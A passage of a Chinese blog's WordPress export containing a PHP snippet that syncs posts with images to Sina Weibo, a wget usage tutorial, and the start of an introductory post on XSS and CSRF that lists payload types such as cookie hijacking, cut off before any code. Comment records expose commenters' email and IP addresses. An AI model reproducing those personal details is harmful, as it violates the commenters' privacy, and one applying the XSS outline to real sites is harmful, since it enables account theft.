属性enctype共有二个值可选，这个属性管理的是表单的MIME编码：
①application/x-www-form-urlencoded(默认值)
②multipart/form-data
其实form表单在你不写enctype属性时，也默认为其添加了enctype属性值，默认值是enctype=”application/x- www-form-urlencoded”.
通过form表单提交文件操作如下：
<pre class="lang:php decode:true">&lt;form method="post"action="http://w.sohu.com/t2/upload.do" enctype=”multipart/form-data”&gt;
&lt;inputtype="text" name="desc"&gt;
&lt;inputtype="file" name="pic"&gt;
&lt;/form&gt;</pre>
浏览器会发送以下数据：
<pre class="lang:php decode:true">POST /t2/upload.do HTTP/1.1
User-Agent: SOHUWapRebot
Accept-Language: zh-cn,zh;q=0.5
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Content-Length: 60408
Content-Type:multipart/form-data; boundary=ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC
Host: weibo.com
--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC
Content-Disposition: form-data;name="desc"
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC
Content-Disposition: form-data;name="pic"; filename="photo.jpg"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary
[图片二进制数据]
--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC--</pre>
先分析一下上面的内容，<strong>然后我们来根据这内容来构造发送的数据。</strong>
第7行指定发送编码是multipart/form-data，并且指定boundary值为“ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC”，这个值可以随机产生，不难理解，boundary就是来分隔数据的。并且每段分隔时boundary值前面需要加“--”，最后结尾处在boundary值的前后加"--"（看上面代码最后一行）。
每段boundary之内，先是数据描述，再是数据的主体。
<a href="http://storage.veitor.net/uploads/2014/08/QQ截图20140818215404.jpg"><img class="aligncenter size-full wp-image-238" alt="QQ截图20140818215404" src="http://storage.veitor.net/uploads/2014/08/QQ截图20140818215404.jpg" width="646" height="231" /></a>
&nbsp;
<strong>现在放上我构造的代码，自己琢磨一下就明白了：</strong>
<pre class="lang:php decode:true">function post_to_sina_weibo($post_ID) {
  if( wp_is_post_revision($post_ID) ) return;
    $get_post_info = get_post($post_ID);
    //发布的文章内容，带所有标签格式
    $get_post_centent = get_post($post_ID)-&gt;post_content;
    //用正则表达式抠图
    preg_match_all('/&lt;img.*?(?: |\\t|\\r|\\n)?src=[\'"]?(.+?)[\'"]?(?:(?: |\\t|\\r|\\n)+.*?)?&gt;/sim', $get_post_centent, $strResult, PREG_PATTERN_ORDER);
   if(count($strResult[1]) &gt; 0)
        $imgUrl = $strResult[1][0];//获得第一张图url地址
   else
        $imgUrl = null;
    //去掉文章内的html编码的空格、换行、tab等符号
    $get_post_centent = str_replace("\t", " ", str_replace("\n", " ", str_replace("&amp;nbsp;", " ", $get_post_centent)));
    //获取文章标题
    $get_post_title = get_post($post_ID)-&gt;post_title;
    if ( $get_post_info-&gt;post_status == 'publish' &amp;&amp; $_POST['original_post_status'] != 'publish' ) {
    //使用wordpress内置request请求类，在wp_includes/wp_http.php里
    $request = new WP_Http;
    //微博文字，格式为“【文章标题】文章摘要132字，全文地址：XXXX”
    $status = '【' . strip_tags( $get_post_title ) . '】 ' . mb_strimwidth(strip_tags( apply_filters('the_content', $get_post_centent)),0, 132,'...') . ' 全文地址:' . get_permalink($post_ID) ;
    //如果没图片则请求这个api
    $api_url = 'https://api.weibo.com/2/statuses/update.json';
    //body内容，source参数为你的appkey，详情见wordpress的WP_http类
    $body = array( 'status' =&gt; $status, 'source'=&gt;'706960568');
    //请将xxxxxxxxx替换成你的，xxxxxxxxxx为“用户名：密码”的base64编码
    $headers = array( 'Authorization' =&gt; 'Basic ' . 'xxxxxxxxxxxxxxxx' );
    //重要步骤，如果文章有图片则构造发送数据包
    if($imgUrl!==null)
    {
    	$body['pic'] = $imgUrl;
    	uksort($body, 'strcmp');
        $str_b=uniqid('------------------');
        $str_m='--'.$str_b;
        $str_e=$str_m. '--';
        $tmpbody='';
        //对参数遍历，进行构造内容，仔细阅读，你会发现和上面讲的类似
        foreach($body as $k=&gt;$v){
            if($k=='pic'){
                $img_c=file_get_contents($imgUrl);
                $url_a=explode('?', basename($imgUrl));
                $img_n=$url_a[0];
                $tmpbody.=$str_m."\r\n";
                $tmpbody.='Content-Disposition: form-data; name="'.$k.'"; filename="'.$img_n.'"'."\r\n";
                $tmpbody.="Content-Type: image/unknown\r\n\r\n";
                $tmpbody.=$img_c."\r\n";
            }else{
                $tmpbody.=$str_m."\r\n";
                $tmpbody.='Content-Disposition: form-data; name="'.$k."\"\r\n\r\n";
                $tmpbody.=$v."\r\n";
            }
        }
        $tmpbody.=$str_e;
        $body = $tmpbody;
        //图片处理结束，使用uploade API
    	$api_url = 'https://upload.api.weibo.com/2/statuses/upload.json';
        //设置Content-Type编码为multipart/form-data
    	$headers['Content-Type'] = 'multipart/form-data; boundary='.$str_b;
    }
    //请求接口发送数据，详见wordpress自带的WP_http类
    $result = $request-&gt;post( $api_url , array( 'body' =&gt; $body, 'headers' =&gt; $headers ) );
}
//最后将这个函数挂到pulish_post钩子上，发表文章后就会触发这个函数
add_action('publish_post', 'post_to_sina_weibo', 0);</pre>
&nbsp;
这段代码理论上来说你可以拿去直接用了，只需按注释上说的修改几个参数为自己的就行了。
这也是我研究琢磨出来的，有任何疑问可以一起探讨。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>234</wp:post_id>
		<wp:post_date><![CDATA[2014-08-18 14:13:59]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-08-18 14:13:59]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[wordpress%e6%96%87%e7%ab%a0%e5%b8%a6%e5%9b%be%e7%89%87%e5%90%8c%e6%ad%a5%e5%88%b0%e6%96%b0%e6%b5%aa%e5%be%ae%e5%8d%9a]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						<wp:comment>
			<wp:comment_id>8</wp:comment_id>
			<wp:comment_author><![CDATA[破小懿]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[xiyizi@9doe.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.9doe.com/</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[14.152.68.91]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-03-06 15:25:36]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-03-06 15:25:36]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[代码小白看不懂呢，唉╯▂╰]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>9</wp:comment_id>
			<wp:comment_author><![CDATA[Veitor]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[dandankele@vip.qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.veitor.net</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[49.80.122.16]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-03-07 18:17:29]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-03-07 18:17:29]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[那我也没办法了]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>8</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>10</wp:comment_id>
			<wp:comment_author><![CDATA[破小懿]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[xiyizi@9doe.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.9doe.com/</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[58.215.136.78]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-03-08 12:27:50]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-03-08 12:27:50]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[是用户名：密码，这种格式么？]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>9</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>11</wp:comment_id>
			<wp:comment_author><![CDATA[Veitor]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[dandankele@vip.qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.veitor.net</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[61.160.251.57]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-03-09 04:37:31]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-03-09 04:37:31]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[是的，那个冒号是英文状态下的]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>10</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>12</wp:comment_id>
			<wp:comment_author><![CDATA[iRedman]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[drawseeorg@163.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://weibo.com/drawseeorg</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[218.82.143.233]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-07-01 14:01:23]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-07-01 14:01:23]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[博主写个插件吧！那我们这些小白就有福了]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>13</wp:comment_id>
			<wp:comment_author><![CDATA[杨阳]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[]]></wp:comment_author_email>
			<wp:comment_author_url>http://t.qq.com/a1796683749</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[1.95.209.149]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-10-10 16:45:29]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-10-10 16:45:29]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[你好 functions.php里加入这段代码后 网站打开空白了 请问是什么原因]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>14</wp:comment_id>
			<wp:comment_author><![CDATA[杨阳]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[]]></wp:comment_author_email>
			<wp:comment_author_url>http://t.qq.com/a1796683749</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[1.95.203.113]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-10-31 17:30:10]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-10-31 17:30:10]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[你好 加入这段断码后 网站打不开 提示500错误 请问是什么原因]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[duoshuo]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>15</wp:comment_id>
			<wp:comment_author><![CDATA[Veitor]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[dandankele@vip.qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.veitor.net</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[49.80.123.53]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-11-01 04:57:32]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-11-01 04:57:32]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[这可能需要你自己排查代码错误了，本身这段代码的逻辑只是在发布文章后执行的，如果你只是在打开网站时出现500错误，那么检查一下是否代码写错了导致编译不通过等其他问题]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[duoshuo]]></wp:comment_type>
			<wp:comment_parent>14</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>16</wp:comment_id>
			<wp:comment_author><![CDATA[杨阳]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[]]></wp:comment_author_email>
			<wp:comment_author_url>http://t.qq.com/a1796683749</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[1.95.203.113]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-11-01 16:21:35]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-11-01 16:21:35]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[请问这段代码 是放到 function.php 里吗]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[duoshuo]]></wp:comment_type>
			<wp:comment_parent>15</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>Linux操作系统之wget命令</title>
		<link>http://wp.veitor.net/2014/08/22/linux%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e4%b9%8bwget%e5%91%bd%e4%bb%a4/</link>
		<pubDate>Fri, 22 Aug 2014 02:50:53 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=253</guid>
		<description></description>
		<content:encoded><![CDATA[<div>
Linux系统中的wget是一个下载文件的工具，它用在命令行下。对于Linux用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。wget支持HTTP，HTTPS和FTP协议，可以使用HTTP代理。所谓的自动下载是指，wget可以在用户退出系统的之后在后台执行。这意味这你可以登录系统，启动一个wget下载任务，然后退出系统，wget将在后台执行直到任务完成，相对于其它大部分浏览器在下载大量数据时需要用户一直的参与，这省去了极大的麻烦。
wget 可 以跟踪HTML页面上的链接依次下载来创建远程服务器的本地版本，完全重建原始站点的目录结构。这又常被称作”递归下载”。在递归下载的时 候，wget 遵循Robot Exclusion标准(/robots.txt). wget可以在下载的同时，将链接转换成指向本地文件，以方便离线 浏览。
wget 非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性.如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。
1．命令格式：
wget [参数] [URL地址]
2．命令功能：
用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录。wget虽然功能强大，但是使用起来还是比较简单：
1）支持断点下传功能；这一点，也是网络蚂蚁和FlashGet当年最大的卖点，现在，Wget也可以使用此功能，那些网络不是太好的用户可以放心了；
2）同时支持FTP和HTTP下载方式；尽管现在大部分软件可以使用HTTP方式下载，但是，有些时候，仍然需要使用FTP方式下载软件；
3）支持代理服务器；对安全强度很高的系统而言，一般不会将自己的系统直接暴露在互联网上，所以，支持代理是下载软件必须有的功能；
4）设置方便简单；可能，习惯图形界面的用户已经不是太习惯命令行了，但是，命令行在设置上其实有更多的优点，最少，鼠标可以少点很多次，也不要担心是否错点鼠标；
5）程序小，完全免费；程序小可以考虑不计，因为现在的硬盘实在太大了；完全免费就不得不考虑了，即使网络上有很多所谓的免费软件，但是，这些软件的广告却不是我们喜欢的。
3．命令参数：
启动参数：
-V, –version 显示wget的版本后退出
-h, –help 打印语法帮助
-b, –background 启动后转入后台执行
-e, –execute=COMMAND 执行`.wgetrc’格式的命令，wgetrc格式参见/etc/wgetrc或~/.wgetrc
记录和输入文件参数：
-o, –output-file=FILE 把记录写到FILE文件中
-a, –append-output=FILE 把记录追加到FILE文件中
-d, –debug 打印调试输出
-q, –quiet 安静模式(没有输出)
-v, –verbose 冗长模式(这是缺省设置)
-nv, –non-verbose 关掉冗长模式，但不是安静模式
-i, –input-file=FILE 下载在FILE文件中出现的URLs
-F, –force-html 把输入文件当作HTML格式文件对待
-B, –base=URL 将URL作为在-F -i参数指定的文件中出现的相对链接的前缀
–sslcertfile=FILE 可选客户端证书
–sslcertkey=KEYFILE 可选客户端证书的KEYFILE
–egd-file=FILE 指定EGD socket的文件名
下载参数：
–bind-address=ADDRESS 指定本地使用地址(主机名或IP，当本地有多个IP或名字时使用)
-t, –tries=NUMBER 设定最大尝试链接次数(0 表示无限制).
-O –output-document=FILE 把文档写到FILE文件中
-nc, –no-clobber 不要覆盖存在的文件或使用.#前缀
-c, –continue 接着下载没下载完的文件
–progress=TYPE 设定进程条标记
-N, –timestamping 不要重新下载文件除非比本地文件新
-S, –server-response 打印服务器的回应
–spider 不下载任何东西
-T, –timeout=SECONDS 设定响应超时的秒数
-w, –wait=SECONDS 两次尝试之间间隔SECONDS秒
–waitretry=SECONDS 在重新链接之间等待1…SECONDS秒
–random-wait 在下载之间等待0…2*WAIT秒
-Y, –proxy=on/off 打开或关闭代理
-Q, –quota=NUMBER 设置下载的容量限制
–limit-rate=RATE 限定下载输率
目录参数：
-nd –no-directories 不创建目录
-x, –force-directories 强制创建目录
-nH, –no-host-directories 不创建主机目录
-P, –directory-prefix=PREFIX 将文件保存到目录 PREFIX/…
–cut-dirs=NUMBER 忽略 NUMBER层远程目录
HTTP 选项参数：
–http-user=USER 设定HTTP用户名为 USER.
–http-passwd=PASS 设定http密码为 PASS
-C, –cache=on/off 允许/不允许服务器端的数据缓存 (一般情况下允许)
-E, –html-extension 将所有text/html文档以.html扩展名保存
–ignore-length 忽略 `Content-Length’头域
–header=STRING 在headers中插入字符串 STRING
–proxy-user=USER 设定代理的用户名为 USER
–proxy-passwd=PASS 设定代理的密码为 PASS
–referer=URL 在HTTP请求中包含 `Referer: URL’头
-s, –save-headers 保存HTTP头到文件
-U, –user-agent=AGENT 设定代理的名称为 AGENT而不是 Wget/VERSION
–no-http-keep-alive 关闭 HTTP活动链接 (永远链接)
–cookies=off 不使用 cookies
–load-cookies=FILE 在开始会话前从文件 FILE中加载cookie
–save-cookies=FILE 在会话结束后将 cookies保存到 FILE文件中
FTP 选项参数：
-nr, –dont-remove-listing 不移走 `.listing’文件
-g, –glob=on/off 打开或关闭文件名的 globbing机制
–passive-ftp 使用被动传输模式 (缺省值).
–active-ftp 使用主动传输模式
–retr-symlinks 在递归的时候，将链接指向文件(而不是目录)
递归下载参数：
-r, –recursive 递归下载－－慎用!
-l, –level=NUMBER 最大递归深度 (inf 或 0 代表无穷)
–delete-after 在现在完毕后局部删除文件
-k, –convert-links 转换非相对链接为相对链接
-K, –backup-converted 在转换文件X之前，将之备份为 X.orig
-m, –mirror 等价于 -r -N -l inf -nr
-p, –page-requisites 下载显示HTML文件的所有图片
递归下载中的包含和不包含(accept/reject)：
-A, –accept=LIST 分号分隔的被接受扩展名的列表
-R, –reject=LIST 分号分隔的不被接受的扩展名的列表
-D, –domains=LIST 分号分隔的被接受域的列表
–exclude-domains=LIST 分号分隔的不被接受的域的列表
–follow-ftp 跟踪HTML文档中的FTP链接
–follow-tags=LIST 分号分隔的被跟踪的HTML标签的列表
-G, –ignore-tags=LIST 分号分隔的被忽略的HTML标签的列表
-H, –span-hosts 当递归时转到外部主机
-L, –relative 仅仅跟踪相对链接
-I, –include-directories=LIST 允许目录的列表
-X, –exclude-directories=LIST 不被包含目录的列表
-np, –no-parent 不要追溯到父目录
wget -S –spider url 不下载只显示过程
4．使用实例：
实例1：使用wget下载单个文件
命令：
wget http://www.minjieren.com/wordpress-3.1-zh_CN.zip
说明：
以下的例子是从网络下载一个文件并保存在当前目录，在下载的过程中会显示进度条，包含（下载完成百分比，已经下载的字节，当前下载速度，剩余下载时间）。
实例2：使用wget -O下载并以不同的文件名保存
命令：
: wget -O wordpress.zip http://www.minjieren.com/download.aspx?id=1080
说明：
wget默认会以最后一个符合”/”的后面的字符来命令，对于动态链接的下载通常文件名会不正确。
错误：下面的例子会下载一个文件并以名称download.aspx?id=1080保存
wget http://www.minjieren.com/download?id=1
即使下载的文件是zip格式，它仍然以download.php?id=1080命令。
正确：为了解决这个问题，我们可以使用参数-O来指定一个文件名：
wget -O wordpress.zip http://www.minjieren.com/download.aspx?id=1080
实例3：使用wget –limit -rate限速下载
命令：
wget --limit-rate=300k http://www.minjieren.com/wordpress-3.1-zh_CN.zip
说明：
当你执行wget的时候，它默认会占用全部可能的宽带下载。但是当你准备下载一个大文件，而你还需要下载其它文件时就有必要限速了。
实例4：使用wget -c断点续传
命令：
wget -c http://www.minjieren.com/wordpress-3.1-zh_CN.zip
说明：
使用wget -c重新启动下载中断的文件，对于我们下载大文件时突然由于网络等原因中断非常有帮助，我们可以继续接着下载而不是重新下载一个文件。需要继续中断的下载时可以使用-c参数。
实例5：使用wget -b后台下载
命令：
wget -b http://www.minjieren.com/wordpress-3.1-zh_CN.zip
说明：
对于下载非常大的文件的时候，我们可以使用参数-b进行后台下载。
wget -b http://www.minjieren.com/wordpress-3.1-zh_CN.zip
Continuing in background, pid 1840.
Output will be written to `wget-log'.
你可以使用以下命令来察看下载进度：
tail -f wget-log
实例6：伪装代理名称下载
命令：
wget --user-agent="Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16" http://www.minjieren.com/wordpress-3.1-zh_CN.zip
说明：
有些网站能通过根据判断代理名称不是浏览器而拒绝你的下载请求。不过你可以通过–user-agent参数伪装。
实例7：使用wget –spider测试下载链接
命令：
wget --spider URL
说明：
当你打算进行定时下载，你应该在预定时间测试下载链接是否有效。我们可以增加–spider参数进行检查。
wget --spider URL
如果下载链接正确，将会显示
wget --spider URL
Spider mode enabled. Check if remote file exists.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Remote file exists and could contain further links,
but recursion is disabled -- not retrieving.
这保证了下载能在预定的时间进行，但当你给错了一个链接，将会显示如下错误
wget --spider url
Spider mode enabled. Check if remote file exists.
HTTP request sent, awaiting response... 404 Not Found
Remote file does not exist -- broken link!!!
你可以在以下几种情况下使用spider参数：
定时下载之前进行检查
间隔检测网站是否可用
检查网站页面的死链接
实例8：使用wget –tries增加重试次数
命令：
wget --tries=40 URL
说明：
如果网络有问题或下载一个大文件也有可能失败。wget默认重试20次连接下载文件。如果需要，你可以使用–tries增加重试次数。
实例9：使用wget -i下载多个文件
命令：
wget -i filelist.txt
说明：
首先，保存一份下载链接文件
cat &gt; filelist.txt
url1
url2
url3
url4
接着使用这个文件和参数-i下载
实例10：使用wget –mirror镜像网站
命令：
wget --mirror -p --convert-links -P ./LOCAL URL
说明：
下载整个网站到本地。
–miror:开户镜像下载
-p:下载所有为了html页面显示正常的文件
–convert-links:下载后，转换成本地的链接
-P ./LOCAL：保存所有文件和目录到本地指定目录
实例11：使用wget –reject过滤指定格式下载
命令：
wget --reject=gif ur
说明：
下载一个网站，但你不希望下载图片，可以使用以下命令。
实例12：使用wget -o把下载信息存入日志文件
命令：
wget -o download.log URL
说明：
不希望下载信息直接显示在终端而是在一个日志文件，可以使用
实例13：使用wget -Q限制总下载文件大小
命令：
wget -Q5m -i filelist.txt
说明：
当你想要下载的文件超过5M而退出下载，你可以使用。注意：这个参数对单个文件下载不起作用，只能递归下载时才有效。
实例14：使用wget -r -A下载指定格式文件
命令：
wget -r -A.pdf url
说明：
可以在以下情况使用该功能：
下载一个网站的所有图片
下载一个网站的所有视频
下载一个网站的所有PDF文件
实例15：使用wget FTP下载
命令：
wget ftp-url
wget --ftp-user=USERNAME --ftp-password=PASSWORD url
说明：
可以使用wget来完成ftp链接的下载。
使用wget匿名ftp下载：
wget ftp-url
使用wget用户名和密码认证的ftp下载
wget --ftp-user=USERNAME --ftp-password=PASSWORD url
备注：编译安装
使用如下命令编译安装：
# tar zxvf wget-1.9.1.tar.gz
# cd wget-1.9.1
# ./configure
# make
# make install
</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>253</wp:post_id>
		<wp:post_date><![CDATA[2014-08-22 02:50:53]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-08-22 02:50:53]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[linux%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e4%b9%8bwget%e5%91%bd%e4%bb%a4]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="category" nicename="xitong"><![CDATA[计算机系统]]></category>
						</item>
					<item>
		<title>浅谈XSS和CSRF</title>
		<link>http://wp.veitor.net/2014/08/24/%e6%b5%85%e8%b0%88xss%e5%92%8ccsrf/</link>
		<pubDate>Sun, 24 Aug 2014 14:03:34 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=256</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>同源策略（Same Origin Policy）</h3>
<div>
<div>
<div>同源策略阻止从一个源加载的文档或脚本获取或设置另一个源加载的文档的属性。</div>
<div></div>
<div>如：</div>
<div>不能通过Ajax获取另一个源的数据；</div>
<div>JavaScript不能访问页面中iframe加载的跨域资源。</div>
<div></div>
<div>
<div>
<div>对 http://store.company.com/dir/page.html 同源检测</div>
<div><a href="http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png"><img class="aligncenter size-full wp-image-257" alt="28230050-d605bfba1f1b48e081353243800c253c" src="http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png" width="915" height="403" /></a></div>
<div></div>
<div>
<div>
<h3>跨域限制</h3>
<div>
<div>
<ol>
	<li>浏览器中，script、img、iframe、link等标签，可以跨域引用或加载资源。</li>
	<li>不同于 XMLHttpRequest，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。</li>
	<li>XMLHttpRequest 也受到也同源策略的约束，不能跨域访问资源。</li>
</ol>
<div></div>
</div>
</div>
</div>
<div>
<h3>JSONP</h3>
<div>
<div>
<div>为了解决 XMLHttpRequest 同源策略的局限性，JSONP出现了。</div>
<div>JSONP并不是一个官方的协议，它是利用script标签中src属性具有跨域加载资源的特性，而衍生出来的跨域数据访问方式。</div>
<div></div>
</div>
</div>
</div>
<div></div>
<div>
<h3>CORS(Cross-Origin Resource Sharing)</h3>
</div>
<div>
<div>
<div>CORS，即：<strong>跨域资源共享</strong>。</div>
<div>这是W3C委员会制定的一个新标准，用于解决 XMLHttpRequest 不能跨域访问资源的问题。目前支持情况良好（特指移动端）。</div>
<div>想了解更多，可查看之前的文章：<a href="http://www.cnblogs.com/maplejan/archive/2012/12/02/2797864.html" target="_blank" rel="noopener noreferrer">《CORS(Cross-Origin Resource Sharing) 跨域资源共享》</a></div>
<div></div>
<div></div>
<div>
<hr />
</div>
<div></div>
<div>
<h2>XSS（Cross Site Script）</h2>
</div>
<div>
<div>
<div>XSS（Cross Site Script） 即：<strong>跨站脚本攻击</strong>。</div>
<div>本来缩写其应该是CSS，不过为了避免和CSS层叠样式表 （Cascading Style Sheets）重复，所以在安全领域叫做 XSS 。</div>
<div></div>
<div>
<h3>XSS 分类</h3>
<div>XSS 主要分为两种形态</div>
<div>
<div>
<ol>
	<li>反射型XSS（非持久型XSS）。需要诱惑用户去激活的XSS攻击，如：点击恶意链接。</li>
	<li>存储型XSS。混杂有恶意代码的数据被存储在服务器端，当用户访问输出该数据的页面时，就会促发XSS攻击。具有很强的稳定性。</li>
</ol>
<div></div>
<div>
<h3>XSS Payload</h3>
<div>
<div>
<div>XSS Payload，是指那些用于完成各种具体功能的恶意脚本。</div>
<div>由于实现XSS攻击可以通过JavaScript、ActiveX控件、Flash插件、Java插件等技术手段实现，下面只讨论JavaScript的XSS Payload。</div>
<div></div>
<div>
<div>通过JavaScript实现的XSS Payload，一般有以下几种：</div>
<ol>
	<li>Cookie劫持</li>
	<li>构造请求</li>
	<li>XSS钓鱼</li>
	<li>CSS History Hack</li>
</ol>
<div></div>
</div>
</div>
</div>
</div>
</div>
</div>
<h3>Cookie劫持</h3>
<div>
<div>
